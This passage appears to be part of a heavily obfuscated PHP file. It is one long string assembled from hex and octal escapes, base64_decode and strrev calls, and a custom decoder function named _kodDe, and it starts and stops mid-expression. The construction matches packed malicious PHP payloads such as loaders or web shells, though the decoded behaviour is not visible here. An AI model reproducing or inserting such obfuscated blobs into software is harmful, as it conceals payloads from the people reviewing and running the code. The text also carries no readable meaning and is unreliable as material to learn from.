xc2\x1e\x38\xc4\xf3\x1c\xca\x41\xd3\xac\x70\x1c\x6d\xf0".base64_decode('kQjpKcoyLMz4ehRuGwIn4sMKlY5CRSyDVkSzQksTsQBOJNzqfvuiP4QA4dNUIavRx7OEx/M=')."\xad\x0\xa1\xc2\xa\x7\x4b\x49\x99\x4d\xcc\x54\x2\x86\x91\x2d\x52\xea\x13\xcf\x21\x92\x5\x3a\xcc\xb2\xdc\x61\x11\x70\xe9\x34\xd6\x19\xb\xb7\x7\x62\xcb\x60\xc8\xc4\x99\x1\x96\xa8\x99\x71\x3c\xa1\x16\x11\xc3"."\352\222\236\363\167\240\126\313\317\373\351\34\163\212\214\316\277\214\42\243\326\320\140\5\236\171\32\4\313\300\52\177\243\315\204\56\125\354\255\263\207\5\230\235\14\362\214\214\311\253\262\210\104"."\361\230\230\65\300\175\230\25\71\127\176\10\47\114\27\343\115\25\117\62\333\35\132\2\135\21\71\5\206\112\131\24\132\366\35\153\204\265\264\334\32\141\171\114\174\43\256\246\370\130\100\317\252"."\x66\x42\x4f\xa9\x49\x8f\xaa\x7a\x74\x9a\x2d\xe6\xb0\x89\x1d\x26\x23\x14\x2f\xca\x87\xf1\x3\x70\xad\x50\x55\x3f\x93\x15\x62\x6d\x87\x1d\xbb\x2b\x11\x55\xd1\xae\x14\xb\xe1\x3d\xa2\xa4\x2f\xd2\x19\x5e\x9e\x30\x28".base64_decode('jAG4jejv6DaDKddtXp5LsUIdreGOUCN+rY54BdZckNNhm6lzoJ5wVI0g/lqVRXHhKIiBHQY=')."\71\125\125\230\206\361\151\102\355\335\56\24\45\173\206\206\111\124\314\333\371\153\24\242\23\217\220\45\40\14\104\160\121\65\311\53\366\341\322\362\326\7\345\135\166\157\15\263\1\347\140\140\312"."\xf1\xcc\x13\xe0\xaa\xe3\xe3\x6e\x9d\x72\x39\x59\xa8\xbb\x8b\xb\x6c\x76\x47\xce\xed\x21\x42\x81\x2e\xc9\xc0\x3\xb9\x6f\x61\x1f\x24\x17\x42\x39\x67\xf3\xd0\x66\x9b\x61\x6\xd3\x54\x5d\xf4\x26\xab\x5b\x16\xbf\xc8"."\116\244\165\305\312\353\111\142\150\125\1\173\200\112\312\224\357\350\140\354\311\231\213\5\355\264\60\205\41\133\50\156\156\142\203\134\314\331\161\75\3\42\372\346\76\362\256\100\74\36\24\117\263"."\xa4\xf7\x6\xe4\x12\x46\xcc\x1c\x35\xb4\xe8\x2a\x8\x35\x85\xf9\xd0\x48\x50\x22\x31\x22\x4c\x12\xe3\x3b\xf\x51\x67\x2f\x93\x1c\x88\xf1\x18\x37\xd8\x6\xe9\xbe\xce\xe4\x8d\xcc\x99\x9d\xfc\x66\x72\x89\xb8\xc7\x81".base64_decode('PQhV4Lzn5OXkUcfXiyWQ2OTHd80hs+1FWia9HMVRRhSyjpdpxRz6iFd+poVwhyRKD0OYVUo=')."\x1a\x9b\x3d\xe\x55\x69\x6c\x1\xd\x40\xa\xfb\x2d\xb0\x1c\x9f\x30\x11\x44\xea\xc4\xbc\x95\x57\x18\xea\x48\x69\xf2\x63\x5a\xc9\xae\xff\x14\x19\x53\xc8\x94\xb\xdc\xee\x37\x64\xab\x1d\x3e\x61\xd5\x99\x2f\x97\x63"."\xf8\x44\xe1\x37\xe8\xa0\x17\x80\xd9\xf6\x7e\x55\x6a\x4b\x27\x87\x17\xf6\x5c\xe9\x68\x48\xd3\x40\x12\x68\x90\x2c\x70\xa5\x41\x34\xa2\xcd\xc0\xf8\x3f\x26\xe1\x8e\x94\xda\xce\xec\x58\x81\x4d\xe9\x88\x39\xc0\x69\x13".base64_decode('Yl/B5JqDPoWjUNan42di9NFOiNvgRAWppbzvL9QlmdWehKSULRcEQP7BAhE9ff8HY7rgCFA=').strrev('ô•?±	JÎò°Å†2‰»hmªˆè/hcl†Ÿ3A}# †UÙdI'."\n".'D¾K	{ï*ò1').strrev('Àœ³ËIgL•7¼ŠœnmÒ—X‹Êl²Ïè(Á4Y€¯éˆy¹D*öL\'èGœ|pÑç“')."\x8e\x48\x86\x73\xb5\x61\x1d\x3f\xc2\x63\xc2\x99\x12\xd\x21\xe8\x4a\x69\xe7\xa0\x89\xf8\xf6\x2c\x1e\xed\x8a\xb1\x9b\x1e\x1c\xc7\x12\x2e\x35\x16\xa\x2e\xe3\x97\x2e\x3c\xb5\x25\xb0\xd8\x9d\x12\xc6\x12\xca\x40\x6b"."\xd9\x64\x2e\x37\xc3\xe9\xe4\x80\xaa\xc6\xa2\x58\xc0\x18\x8a\xb4\xb8\xa\xc4\xdb\xb8\xd\x66\x67\x9a\x1a\x9\x77\x2c\x2a\x9b\x81\x18\x92\x76\xa9\x8\x4d\xc\x27\x42\xed\xee\x34\x67\xd\xf1\x50\x20\xc6\xc\x84\xe3"."\170\123\44\32\224\262\303\321\322\221\340\34\17\117\244\342\111\232\350\77\276\252\147\25\71\61\65\240\203\123\152\65\226\143\170\325\336\151\325\13\173\326\124\127\365\370\27\372\152\270\370\215\222"."\x2b\xe9\x11\xf3\x24\xc9\x16\xdb\x7c\x1a\xdc\x9\x78\xdf\x62\x89\xb4\x18\xc4\xfc\x3e\x1f\x7c\x84\x7\xfc\x3d\x7e\x66\x1\xcd\x2f\x32\xe1\x57\xc0\x1f\xe9\xda\x63\xc0\x20\x7f\x9c\x9a\x93\x72\x34\xd4\x65\x6b\x85\x59"."\x2f\xf0\xb9\x5f\xca\xa9\xec\x79\x1c\xa3\xac\x5a\x3f\x53\x23\x8\xd3\x4b\x5c\x35\xbe\x2c\xce\xe7\xca\x99\xe6\xc0\x48\x8a\xd3\xb2\x36\x85\xb\x18\xfd\xed\x94\x41\xb1\x46\x51\x59\x40\x7\x4a\x3b\x1e\x8f\xcb\x49\x3e".base64_decode('wxSrRSzrlJksYgNWYo7EU3OU5HNUgQj6oJARwKqMs9WbQ3slbMZBxLW2toWPXRRp74h2Hhc=')."\x8b\x27\xba\x16\x2f\x59\xba\xc\xec\xa7\x36\x30\xa4\xe9\x57\xbc\x4c\x22\x2\x6\x89\xfd\x88\x5f\xf7\xf\x33\x67\xc\x8b\xf1\x81\x44\xb7\xfc\x32\x33\xc7\x13\x51\x1f\xb1\x25\x69\x66\x53\x8e\xa\x32\x78\x2e\xa6\x1e"."\376\362\131\264\66\177\66\147\327\115\2\321\131\320\373\114\323\236\44\167\161\373\167\127\14\231\335\75\126\57\307\322\224\76\314\72\255\203\106\257\320\315\263\304\171\14\270\15\257\354\35\2\243"."\255\314\70\246\372\134\154\1\44\10\373\235\22\363\40\22\271\121\161\32\35\323\205\12\244\71\42\31\345\146\253\7\25\7\226\12\214\4\267\142\233\270\314\6\356\20\61\151\352\266\207\72\344"._kodDe('MfPC5go9r33kigQKTYRewTq2kL1D+1vXASPqVFta+70MTQPRFS/CAaMEmyRxI5tHxHbSFck2').base64_decode('nGh+NigzwNtCC2K9U0o35aZB/o85MeIwgEY9ijBkziS3TgvlbLlgIZv0JFgYcoXWyCYqGDE=')."\316\16\12\325\264\354\40\327\20\111\72\230\21\274\357\267\110\32\154\202\337\0\27\51\50\257\151\214\151\15\303\303\333\246\261\230\344\374\311\141\36\104\166\52\243\345\363\301\64\356\223\143\115"."\73\222\222\162\244\37\353\265\310\372\60\116\263\351\50\273\231\62\175\51\16\157\211\20\267\203\336\57\131\110\57\251\1\61\210\271\20\263\61\120\222\213\270\111\103\144\177\167\133\332\311\360\162"."\140\207\322\141\212\155\45\26\133\244\107\217\172\115\313\362\346\13\46\326\210\153\64\262\3\176\153\4\362\62\232\145\57\166\130\165\372\136\323\350\330\72\111\73\147\257\241\11\243\136\202\345\354"."\x23\x50\x14\x27\xf9\xb\xc4\xa\xb0\x67\x4\xb6\x13\xf\xb1\x3c\xaa\xd6\x32\x84\xf1\xa3\xb6\xf9\xb1\x61\x4a\xc2\x7\x73\x45\xb6\x68\x9c\x5d\x1e\x39\x7b\x4f\x1d\x83\x49\x27\x73\xb0\x88\xd7\xca\x54\x7d\xb8\x15\x72"."\x61\x74\x9a\xca\xfc\x69\x58\x18\x6b\x46\xec\x7c\x60\x0\x1b\x6b\x31\x73\xcc\xf5\x11\x75\x4a\x21\x9b\xac\x4f\xe9\xa4\xb9\xdc\xc6\x80\x64\xed\x1d\x3b\x46\x41\x4b\x9f\xe9\xfa\x49\x76\xdf\x11\x83\x38\xc0\xa7\x91\x98"."\x61\x96\xed\x55\xe2\x21\xf7\x66\x1d\xfe\x50\xe8\x4\x39\xad\xa9\x5b\xba\x3e\xc8\x74\x13\xf1\x6c\xb\xa\x53\xe0\x46\xef\xe9\x55\xb0\xb7\x6c\x82\x57\xd2\x36\xa4\xeb\x49\xf2\x93\x81\x3f\x7\x72\x81\x34\xf5\xc0\x1"."\355\245\77\313\313\265\336\133\20\166\350\321\354\120\177\36\213\364\61\146\57\374\273\115\216\367\264\366\264\367\44\344\356\332\5\255\277\37\65\126\262\104\313\47\121\30\236\7\114\42\176\155\130".base64_decode('9yc3Ww93HDHatSA+bI1ivyLC0mlXLOK4mwJQ1onxtDfIlL/MYiZFDrDoi2YGnd3FLfWOi68=')."\332\161\347\205\273\266\135\271\343\354\353\267\337\373\300\216\313\357\247\351\164\120\232\365\34\237\332\35\147\376\146\347\3\127\354\332\274\355\335\213\67\177\370\340\131\273\266\154\305\132\110\277\275"."\236\52\45\115\234\163\322\216\13\157\233\70\347\214\135\167\237\262\343\376\163\167\134\161\362\273\227\234\373\316\332\223\140\161\344\210\311\325\100\141\240\50\206\202\26\331\161\325\203\23\17\236\363".base64_decode('7gWX7NqyRYK3sY5cRlodaKIm1p367sk3Tpxz3s4LfltSgH7APZW4exeetvPSU6Qcd6EmYiw=')."\x5f\x9c\xda\x79\x19\x9a\x31\x71\xee\x86\x9d\xbf\xbb\xcd\x5d\x88\x7a\x4f\x28\x53\x68\xc7\x45\xeb\xb7\x3f\x70\x8f\xab\x50\x87\x19\x2f\x26\xd3\x4d\x92\x55\xfe\x1d\x67\xad\x9f\xd8\x7c\x29\xff\xc8\xf6\x7b\x37\x50\x25"."\171\127\21\256\25\307\341\151\375\245\360\161\206\264\315\246\156\241\255\263\135\263\223\260\116\167\156\172\30\265\207\216\230\74\163\23\133\326\355\274\352\304\235\233\116\207\231\330\270\145\342\334\33"."\x76\x6c\xba\x76\xe7\xd5\x9b\x79\xb5\x80\x55\xe\xed\x5b\x5c\xc1\xed\x27\xed\xba\xe7\xd4\x1d\x17\xdf\xc3\x1\xf1\xaa\x4e\x29\x2\x86\x60\x14\x85\xc1\xf\x2\xc8\x7\x77\x3e\x74\xde\xce\x7\x2e\xc7\x48\x72\xc6\x49"."\73\117\272\157\342\362\333\46\256\130\313\77\73\161\357\275\142\224\243\176\342\375\255\14\75\75\16\247\3\105\355\27\52\334\371\242\344\200\120\246\141\230\13\343\116\343\260\134\212\72\272\140\314".base64_decode('FfFJAe6TGtm6ROOYazJTMParKhB1rGioOKoK/VZXeCrwmYPEMX3ECaQdFQ1HVZFANZiEGoc=')."\xad\x41\x32\x1b\x2d\x16\x1e\x48\x6b\x17\x22\x2\x21\xdd\x69\x2e\x24\x3b\xd\xde\xc7\xea\xfd\xf5\x7e\xb6\xb7\x2d\x1c\xc2\x5f\x14\x4e\xcf\xba\xf8\x96\x22\x58\x40\xba\xb9\x50\xf7\x34\xec\xe2\xb3\x43\xb7\x47\xcc\x82".base64_decode('rMdcz94FpqWtIWsBkaduI4SoC1CPqhmeu6EU6aBAH9UUdoBvvWPi1DvfvXiTG5bKUti7QcQ=')."\221\225\170\314\244\257\110\46\316\333\130\372\75\2\357\374\32\3\236\70\361\362\235\27\270\40\231\156\255\42\11\315\104\1\202\375\56\72\302\111\277\134\204\342\373\377\146\25\121\21\146\3\26"."\xe6\xd3\x84\xa5\xde\xae\xfc\x58\x31\xe7\xc5\x42\x2d\x6f\x5c\x36\x26\xea\x72\xfc\x54\xeb\x84\xc7\x62\x29\x27\xbc\xcc\x12\x24\xc5\xd6\x9a\x15\x41\xea\x90\xaa\x41\x91\xdd\xc5\x49\xd6\xd1\x89\xc8\x93\xee\x5d\x4c\xdb".strrev('{+ÔŒ°E Qîd¯ncÿN È1<Û\\-kÇ«ˆ¼Uµ‹Ú¸Ç'."\0".'2u@`ÌŞ/Ğç’À·0Ò	').base64_decode('RBtFhzKcjb3XeLHE1WukJssRhKNsU5Pg76IcSFfRSLk/SbRyvMUi+2DZSuUjIwMgnQjz+hw=')."\216\133\64\64\327\374\122\321\355\27\106\234\267\265\122\267\45\313\262\51\245\176\172\303\314\271\15\354\101\345\321\114\251\250\230\147\352\377\50\310\334\232\114\361\367\63\132\43\374\211\261\276\341"."\11\227\234\355\70\222\305\60\162\47\46\214\110\71\340\104\153\35\336\360\240\243\124\334\43\171\7\42\327\75\224\104\141\125\73\225\173\121\52\103\255\15\346\41\113\162\217\301\347\141\200\5\12"."\374\124\257\211\225\321\227\31\24\35\40\144\5\20\173\20\265\317\24\147\41\302\205\112\4\41\231\56\346\6\33\245\114\305\66\115\45\253\345\306\340\310\71\325\152\230\152\315\303\37\152\304\117"."\x3b\xac\xa9\xcc\x85\x16\xde\x98\x84\x7d\x54\x6a\x83\xb\x72\xe8\x4d\x96\xf\xfb\xc3\xf3\xe1\x5d\x2f\x56\x64\x6f\x2d\x89\x1c\x98\x86\x3b\x9\x7d\x87\x1d\x8f\xba\x22\x83\x8c\x48\x57\x6b\xb8\x43\x52\x5\x94\x12\xd4"."\x60\x73\x87\x1a\xe8\xec\x2c\x9b\x21\x7f\xc3\x8f\xf5\x68\x7c\x2b\x25\xc7\xa8\x34\x34\x1f\x9d\xb4\x94\x24\x7e\x48\xd4\x58\x81\x53\x2b\x14\xab\x90\x64\x6\xc5\x2b\xfc\xa0\x59\x46\x0\x4\x47\x34\xdf\x80\x22\x95\xb8"."\210\322\217\360\303\113\102\64\273\162\301\174\277\1\45\175\376\43\61\275\366\143\235\272\334\321\170\32\145\25\37\222\332\42\114\232\51\312\174\115\241\103\327\130\111\156\116\52\225\64\332\323\271"."\x42\xf1\x2\x77\x61\xee\xcc\x6e\xbe\x5f\x93\x33\xf1\xca\x89\x99\xec\x38\xc8\x8f\xe0\xc3\xdc\xf8\x67\xd9\x4b\xb3\x80\xe4\x6f\x80\x78\x93\xa\x6a\xb9\xc5\xa5\x45\x70\xe5\xbe\xa4\x9c\xc5\xbc\x8e\xa6\x89\xe8\xc0\x75"."\x1\x3b\x3f\xbf\x60\x3e\xbe\xeb\x61\x5a\x7b\x7e\x12\x99\xef\xcf\x2f\x90\x67\x9b\xbc\xf6\x2a\xfd\x98\x9f\x48\x92\xfc\x42\x54\xa1\x52\xff\xb0\xe5\x6f\x28\xf9\xc5\x5c\x19\x3c\xc2\x1a\x36\x68\x21\x30\xd5\x6\x2d\x39"."\x88\x91\x52\x6c\x17\xd0\xc\xc8\xe8\xc4\x82\x7\x9a\xe1\xf0\xc4\x62\x4b\x4a\x51\x45\xfc\x3a\x93\x5c\xf3\x14\x84\x9f\xbd\x55\xab\x68\x45\xd8\x9\xd2\x9a\x35\xa5\x69\xa0\x66\xed\xce\xa\xe4\xd\x77\x12\x46\x38\x77"."\32\26\10\211\64\264\357\71\77\103\221\135\6\22\51\14\206\376\212\62\221\216\126\21\241\107\167\107\146\67\123\220\42\261\236\356\112\137\315\232\65\176\203\51\43\62\105\50\126\326\307\241\151"."\274\307\347\204\107\75\201\241\347\200\220\340\206\244\110\165\54\140\321\176\376\32\361\324\223\53\35\52\130\23\261\261\161\101\67\147\265\172\131\236\112\344\46\362\334\61\126\325\250\233\303\220\2"."\235\45\23\113\170\60\330\41\230\161\362\40\32\261\336\256\107\321\262\323\163\276\322\50\355\362\21\241\137\300\151\4\175\241\360\126\50\123\73\32\16\344\363\16\42\305\42\370\132\54\143\364\371"."\71\145\241\127\145\276\244\170\54\311\100\10\135\163\245\143\65\103\127\6\366\320\104\222\207\21\21\66\13\234\22\362\164\124\27\117\204\225\200\251\225\104\234\170\366\174\53\131\60\362\266\203\122".strrev('…`¨#îWêÊºÒ° ¬i×ñó¼#iê´'."\n".'ˆ+ğ'."\n".' £XmJİ±ÄÜ?R')."\302\350\163\126\343\343\130\260\115\264\347\362\267\167\340\126\264\53\6\317\232\2\35\160\101\171\344\361\364\367\250\43\371\274\142\237\247\31\304\133\223\107\33\204\22\22\6\276\37\13\152\51\20"."\xb8\x37\xed\x8c\x45\x13\xd1\x20\xf3\x9\xe8\x94\xe8\xd2\xb4\x19\xec\x30\x62\xd1\x67\xa7\xe2\xfc\xc6\xde\xdc\x71\x5d\x25\x6\xc1\xb9\x10\x3f\xa4\x0\x36\x14\x8a\xb9\x1c\x57\x13\xc5\x28\xcd\x77\xcf\xc6\xf2\x7f\xba"."\311\35\252\236\352\235\44\137\351\326\330\15\53\210\235\351\225\61\173\64\12\355\104\373\164\2\277\365\267\40\131\262\241\212\55\270\352\51\137\67\65\146\320\130\313\36\136\61\245\124\361\336\222"."\x41\xca\x39\xa\xde\x6c\x7a\xe5\xd5\xe4\x7\xa\x2b\x16\x5f\x25\xbe\x14\x4\x7f\x58\x95\x9e\xca\x2a\x5f\x4d\x75\x65\x69\xe\x55\xff\x75\xe6\x63\xdd\x3a\xf5\xd8\x38\xca\x4\xef\x53\xc0\x34\x90\x97\x8d\xc1\x48\x38"."\xd4\x91\x50\xc3\xc0\x2f\xd4\xd5\xcf\xf6\xd5\x8a\x57\x87\x86\x25\x6c\x12\xd3\x70\x90\x2b\x2e\x15\x74\x32\xaa\x3e\x47\xb7\xca\xc\xd\xbd\x95\x49\x70\xe5\x55\x3d\xe7\x10\xca\xd2\x21\xcd\x98\xcc\x5a\x6e\x7d\x6d\x6d"."\255\267\266\16\375\317\136\143\60\33\235\15\314\174\217\4\122\133\333\100\376\247\31\344\146\4\120\320\231\203\250\46\43\367\0\60\242\353\320\40\330\136\321\211\272\310\370\326\356\40\176\54\252".base64_decode('4KbBtAjlW4R9xIgto7wOj6sK0RCAmC4GISt5CY2D0eMBB7azCwNq4JztrKhRA2SAoO38HTI=').strrev('Iã>òJoˆ)ÅÊZq•'."\r".'4ta¸‰D(²¼2ËßûaDÓ@Øùåº¥ÊÈŞ}h+')._kodDe('KIFuWg/wv4QlDcAafzWRG9wCp5ktmXiyE+Acf9/B8Cd5qSLJGH7cTiASD4wzvr3YhiAJvzmK').base64_decode('9OAajyvbnyRwru4mdIWAxyMGQAaNjMM+gSoVlcd2HgZkPUk4S2Lv2LihXtzuBjGKiL4FuA8=')."\x2c\xaa\x1d\xcd\xda\xab\x0\xc5\xa1\x51\x62\xfe\x9f\xba\x85\x26\x72\xa0\x86\xfd\x4a\x26\xdc\x76\x4f\x36\x99\x37\xc7\xfd\x87\x5b\xef\x90\xc5\xa4\xd9\x63\x57\x62\xf1\xef\x51\xd\x64\x29\x21\x96\x40\x2f\xf7\x82\xdc".base64_decode('dK5UgTvLVSZAb9JKCkB6KTS5gCwDjdNd0MRIbpDbApct51IRlqSCZoFDFKH/w+oYlg60vnw=')."\xc1\x1c\x40\x98\x60\xc9\x83\x86\xd2\x3b\xcb\x27\x73\xf0\x52\xc8\x32\x40\xbc\xf5\x32\x9c\x9c\x88\xaf\x36\x99\xbf\x79\x40\x2d\x61\xd3\x40\x4b\xf1\xcd\x53\x2\x2d\xb9\x1a\xc5\x89\xce\x15\x2e\x65\x4\xb9\xab\x3a\x39".base64_decode('EZ+UZY0vcjBx1oGP4M4U3rLvQDomMbELWs7ql1VYGJigUliaJfs5VR1ownCVKZjhERKqHM4=').strrev('›åe¾åaáAŸ8<î½½æs"¯Mæ†ÇcüÂ ®HòÍ=~!âûeFšt')."\x39\x3c\xa4\xaa\x2c\x6e\xc2\x2b\xba\xcd\xb6\xa1\x4f\x65\x10\xd1\x89\x6c\x25\x58\x45\xf6\x75\x5c\x41\x3\x27\x4b\x52\xc\xd7\xce\x2e\x45\xd1\xb9\x1c\x6c\xc7\x78\x70\xb2\x42\xfd\xb6\x2b\xd8\x39\xfd\x14\xe7\xfc\x94"."\x16\x0\x87\x71\x26\xe2\x2e\xb1\x1d\x6e\xb9\x10\xae\xab\xcb\x45\xa2\x16\x71\x2a\x89\x63\xbc\xad\x94\xb5\x63\xca\xb1\xca\x54\x5f\x3d\x28\xee\x4e\x65\xae\x62\x28\x8d\x16\xea\x19\x7e\xc7\xfd\x80\xf\xa1\x14\xe6\xb5".strrev('û”Ø¹2‘{ˆóí¤*õ#–4‰Ïm®E6–sŠi6)B÷}›d¦êYÛbP‹ÚúÆØ')."\x1a\x37\x54\xe\xdb\x1\x82\x31\x6d\x7e\xec\xc6\xd5\x7\x52\xd2\x3e\x1b\x91\x99\xe2\x4\x2d\xe2\x5d\x20\x9a\xea\x50\x40\x90\x9c\x24\x70\x50\xd4\xc\xd6\x78\x8d\xb5\x8d\x68\xa0\x12\x67\x14\x92\x24\xc0\x15\x75\xeb"."\353\342\22\22\33\204\242\322\26\115\30\4\233\355\361\314\25\205\320\163\45\101\101\225\337\336\270\216\5\116\25\310\25\227\324\43\313\264\17\152\345\165\342\26\344\204\232\55\160\72\5\75\151"."\26\122\170\227\224\214\347\344\354\230\76\40\107\211\256\3\133\42\302\214\275\134\5\266\265\46\321\42\274\64\3\111\273\50\133\156\223\74\135\240\230\344\14\105\342\136\275\165\12\147\173\125\132"."\63\215\114\223\62\10\174\71\16\330\45\15\226\236\316\21\1\131\274\330\307\257\256\135\274\50\173\215\247\310\254\36\173\136\207\53\40\266\253\160\17\54\71\17\125\213\55\314\213\236\311\105\310"."\67\113\212\320\74\314\155\211\167\170\162\216\205\175\232\164\261\131\54\227\123\346\123\44\113\32\321\44\147\277\141\164\304\40\101\306\230\316\24\304\275\165\365\136\146\0\123\176\233\307\116\164\260"."\xb9\xa0\x85\x25\xa1\x1\x3e\x13\x33\xda\x6\xea\xd5\x0\x27\x60\x4c\x49\x9\x80\x98\x78\x12\x16\x6b\x88\x5d\x2b\x3e\x9f\xc4\x0\x16\x8f\x15\x24\x6\x43\xe7\xaa\xd7\xc4\xfe\x93\x4c\xeb\x85\xbe\x13\xd5\xc8\xc6\x0"."\x5d\xe5\xf2\xe9\x8\xe1\xec\x66\x87\xe\xbd\xb\x0\xad\xf\x67\x3e\x38\x2d\x11\x8d\xa1\x26\xa8\x4c\x87\x4e\xa3\xab\x12\x70\xae\x23\xbb\x65\x21\xa5\x44\x3f\xc4\x43\x3\x94\x64\x52\xd7\x28\xd2\xc0\x8\xbd\x2d\x6a"."\31\213\275\244\340\104\116\44\47\114\236\130\252\373\205\261\22\252\244\106\14\340\230\134\125\215\215\30\70\244\230\355\143\374\251\71\326\253\304\73\67\327\234\267\344\10\313\345\310\151\71\42\124"."\217\324\121\232\47\161\250\21\235\331\43\140\307\373\316\266\116\77\117\152\342\313\223\112\127\204\205\300\40\123\326\324\107\165\70\11\216\144\215\244\22\211\266\206\203\201\110\163\70\276\110\31\300"."\267\272\102\207\21\65\127\45\313\126\265\204\237\40\342\52\311\271\300\211\10\233\116\7\303\365\76\356\173\7\7\275\175\350\160\341\115\361\103\231\45\216\137\244\207\120\231\360\175\350\254\226\142"."\245\136\50\251\61\207\37\23\146\112\312\140\301\174\31\350\214\220\53\113\300\371\202\136\12\77\246\143\135\112\251\305\122\201\142\231\326\0\174\371\57\20\307\111\62\64\342\231\364\334\144\215\67"."\x72\xc3\x86\x65\x8\x72\xc0\x4a\x8c\xc9\xb5\x7\x9a\xdb\xc3\x1d\x6a\x20\x12\x89\x2e\x71\xe8\x22\x8b\x2b\x89\x2\x97\xbe\xa4\x64\xbf\x57\xd2\xcc\x88\x49\xa0\x5f\x97\xed\x50\xca\x29\xe\xc7\x20\x2e\x89\xc\x9d\x3e"."\331\60\152\236\335\244\201\307\136\356\314\206\106\45\277\164\371\202\146\130\272\224\100\135\250\325\301\373\74\55\223\161\170\237\315\364\113\321\242\163\277\55\373\51\225\176\200\245\21\356\167\162\200"."\130\270\265\55\361\77\156\252\221\22\246\3\215\24\323\132\343\157\261\251\237\233\240\354\263\230\175\123\170\123\52\115\371\237\372\365\363\210\333\110\225\130\117\143\216\105\115\162\226\2\106\237\246"."\x85\xa3\x2a\x91\xa4\xab\xe2\x13\x88\x8b\x29\x8c\xe5\xe5\x5b\x60\x7f\xa\x6a\xc0\xc6\x5d\x43\xec\x31\x12\x8e\x88\xc3\xc\x86\x82\x4a\xf0\x57\xe8\x11\x17\x9d\xdc\xb1\x14\x92\x1d\x7b\x98\x44\xf\x91\x11\x18\x70\x87"."\246\246\313\61\241\133\45\337\341\166\260\344\33\304\225\15\315\353\306\275\100\220\275\242\117\50\306\135\127\211\242\356\234\62\15\100\331\212\220\215\161\0\245\121\251\245\56\64\271\133\42\145\76"."\263\70\41\76\100\314\30\206\262\171\333\161\374\157\223\237\347\110\123\102\23\260\240\250\300\245\176\164\316\131\24\117\54\273\257\66\125\171\357\44\164\130\34\12\261\22\247\231\35\53\111\160\210"."\321\42\254\67\134\275\32\273\162\312\365\233\362\250\23\172\216\137\150\121\317\270\124\72\341\101\347\21\335\56\365\245\107\213\377\337\24\244\231\161\311\122\257\263\222\322\6\131\356\375\123\360\162".base64_decode('2E1g2hxxusvFKW7HgA6XgNIKI/YTZCeGzkKeEpdaCvF5riBiBHOP9YTY6ZcAS5+eSn964Jc=')."\xed\x86\xee\x46\x50\x3a\x7\x9f\xac\xe6\xa8\x18\x4c\x1b\x99\x54\x81\x6b\x80\x89\x84\x76\x5d\x88\x24\x48\x29\x44\x58\xf2\x1a\xf3\xed\x4e\x5c\x86\x36\x33\x92\xe\x5e\xbc\xca\x79\x8b\xc4\xe6\x4d\x9d\xce\xc8\x84\x8f"."\67\261\365\72\175\136\161\265\3\113\54\41\313\166\170\131\113\230\11\155\300\103\121\25\23\105\21\153\32\223\303\262\312\77\351\5\312\144\142\303\24\237\357\5\22\0\163\311\232\362\20\207\240"."\x94\x2e\xba\xdd\x84\x49\xeb\x93\x93\x5f\xb9\xf4\x0\xb1\xda\x9\xea\x89\x8e\xf7\x7c\x5\x74\x44\xd3\xd9\x16\xe2\x0\xa3\x49\x7e\x2d\x9f\x17\x97\x28\xf2\x8e\x8b\xfe\x75\x3c\xd5\x86\xbc\xae\x44\x9b\x4a\x8c\x97\xa8"."\x54\x77\x22\x2e\x70\x4e\xba\xd8\xa4\x89\x70\xc9\x59\xcc\x85\xe9\x65\x8e\x23\xb5\x20\x1d\x1e\x65\x1b\xd7\xf4\x82\x47\xbc\xf8\x5\x70\xd4\xce\x4e\x7a\xe9\xb\x3\x26\x57\xc9\x2e\xe2\xb9\x40\x1e\xd1\x23\x7e\xc6\xf6"."\227\136\334\143\315\66\240\50\130\223\210\251\160\15\232\344\214\346\223\117\167\0\240\314\147\146\147\20\317\351\25\130\342\130\323\30\253\20\267\115\275\257\22\242\41\23\267\362\251\204\17\47\164"."\326\13\144\202\75\203\245\273\36\66\361\300\154\303\146\370\151\214\73\201\225\242\174\105\70\135\332\321\245\103\176\232\365\176\176\324\302\161\301\134\310\26\234\204\346\220\333\155\153\251\13\132\346".base64_decode('bpatPfA1W8aB7KT+Zz3idfh3ecoTb5HzaC6dzoQ5a8JPMyUHIvdZiE+Gq0DMPWEJs1SULXQ=')."\x23\x1c\xde\x71\xa5\x5e\x3\x6d\x2c\xf5\xb0\x2b\xd\x83\xd4\xef\x62\x21\xe3\x21\x6a\x22\x1e\xa6\xa5\x59\xd6\x49\xaf\xc3\x6f\x9f\x7b\x42\xcb\xb8\xf9\xfd\xde\xa\xe1\x11\x6\x39\xa\xa6\x9c\x64\xb3\x61\x7e\x5f\x81"."\x5d\x96\xbb\xc1\xc\x7\xc6\xa3\x1d\x5c\x3c\x50\xa4\xa6\xa5\x4b\x76\x98\x65\xd9\x54\xfd\xf4\x99\x73\x65\x91\x8b\x98\x42\x71\x85\xcc\xbc\x57\xd0\x1f\x60\x92\x4\x52\x28\x4e\x34\x54\x98\x3d\x6b\x99\x7c\x90\x4c\xe7"."\253\236\122\217\320\256\55\344\177\266\140\304\351\205\202\112\232\304\274\276\162\116\40\45\74\225\124\334\244\35\325\245\220\144\142\35\41\113\254\72\272\207\12\77\320\316\157\121\376\243\114\77\244"."\215\123\54\26\352\333\327\314\340\223\177\26\137\63\330\5\315\171\240\55\167\156\43\43\301\16\211\130\122\54\142\116\15\57\220\361\210\154\351\140\47\327\150\233\156\1\25\56\216\67\126\42\154".strrev('!+Û5z›?"¬ }ó¦¤³ÆS20Çüs½£û¸mªœz4gd	ƒÿD¢M«J'."\n".'Ì2æ')."\247\44\340\324\355\50\231\154\40\27\342\10\355\354\267\253\172\124\114\324\321\353\121\46\3\52\345\27\45\67\317\302\150\243\304\51\342\322\354\341\373\44\22\10\362\356\332\311\163\311\256\144\311"."\xa3\x65\x61\x73\x88\x2c\x5d\xc7\x32\x96\xc\xc4\xcb\x8f\x7e\x49\x45\xf2\xfa\x28\xad\x5a\x72\xcc\x2b\xe4\x56\x44\xd0\x5\x3d\x82\xc5\x4d\xf4\x36\x48\x33\x3\xad\xfc\xc9\xb8\x26\xe9\x29\x3a\x85\x69\xc0\x1d\x4a\xe"."\xe9\xd1\xf0\x49\x3e\xdb\x4d\x39\x2c\x39\x7c\x46\x7b\x42\x94\x3d\xf0\x40\xcd\x71\x9c\x83\x51\x5c\x98\x44\x97\xe8\x57\xca\x95\xc8\xc6\x8c\x10\xd\xe1\x9d\x9c\xb0\xce\x35\xc0\x34\xcb\x86\x9\x1c\x27\x2f\xee\xb9\xd4".base64_decode('cRKz3O6LEWfpcNOSKnEWD2SUvOejX5M2YrHnilAHcxaDI5KAmhzfeKbDfgM2VOiiGMwqhOU=').strrev('‚Í